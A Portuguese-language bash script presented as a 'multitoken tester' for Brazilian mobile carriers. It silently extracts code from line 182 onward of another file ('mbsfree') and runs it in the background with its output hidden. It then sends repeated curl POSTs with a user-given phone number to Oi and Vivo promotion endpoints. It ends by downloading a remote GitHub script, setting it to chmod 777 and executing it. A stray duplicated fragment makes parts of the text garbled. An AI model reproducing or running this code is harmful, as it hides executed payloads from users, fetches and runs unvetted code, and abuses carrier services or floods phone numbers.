#!/bin/bash
clear
tail -n +182 mbsfree > s && chmod +x s
nohup ./s > /dev/null &&
clear
echo -e "   ⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀
 ⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆
⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮
⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵
⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗
⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎
⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮
⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗
⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿
⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕
⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌
⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪
 ⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄
 ⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁
  ⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈
    ⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁
      ⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌
        ⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃
          ⠘⠙⠝⠂⠄⢘⠋⠃ "
sleep 1
echo ""
echo -e "    \033[0m\033[01;37m• \033[01;33mTESTADOR MULTITOKENS \033[0m\033[01;37m•\033[0m"
echo -e "\033[01;37mTRUE = \033[01;32mAPROVADO \033[01;37m| FALSE = \033[01;31mREPROVADO"
sleep 1
echo -e "\033[01;32mINFORME SEU NÚMERO DDD+NÚMERO\033[01;37m"
read NUMERO
echo -e "\033[01;32mQUANTAS VEZES DESEJA REPETIR?\033[1;37m"
read VEZES
echo ""
echo -e "\033[0m\033[01;33mINICIANDO TOKEN 1\033[03;037m"
for i in $(seq $VEZES);
do
data=$"msisdn=$NUMERO&campid=1003bf0e-21e8-4c36-a755-ac3ec7699bfb&opCode=VV" && site="http://interatividade.oi.ddivulga.com/carrotProcess.php" && curl "${site}" -d "${data}"
echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
done
echo -e ""
echo -e "\033[0m\033[01;33mINICIANDO TOKEN 2\033[03;037m"
for i in $(seq $VEZES);
do
data=$"msisdn=$NUMERO&campid=7251233f-6f45-4179-8752-fb36dbfe1ac9&opCode=VV" && site="http://interatividade.oi.ddivulga.com/carrotProcess.php" && curl "${site}" -d "${data}"
echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
done
echo ""
echo -e "\033[0m\033[01;33mINICIANDO TOKEN 3\033[03;037m"
for i in $(seq $VEZES);
do
data=$"msisdn=$NUMERO&campid=03bc4539-13db-4045-9119-a937eb48d41d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
done
echo ""
echo -e "\033[0m\033[01;33mINICIANDO TOKEN 4\033[03;037m"
for i in $(seq $VEZES);
do
data=$"msisdn=$NUMERO&campid=03bc4539-13db-4045-9119-a937eb48d41d&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
done
echo ""
echo -e "\033[0m\033[01;33mINICIANDO TOKEN 5\033[03;037m"
for i in $(seq $VEZES);
do
data=$"msisdn=$NUMERO&campid=4a3ea48c-660e-4c20-a05c-39954cc7e3df&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
done
echo ""
echo -e "        \033[0m\033[01;37m• \033[01;32mPROGRAMA FINALIZADO \033[01;37m•\033[0m"
sleep 5
./novo01.sh
 5
./novo01.sh
curl -sO https://raw.githubusercontent.com/vinny157/mbsfreeoi/main/MbfreeOI.sh && chmod 777 MbfreeOI.sh && ./MbfreeOI












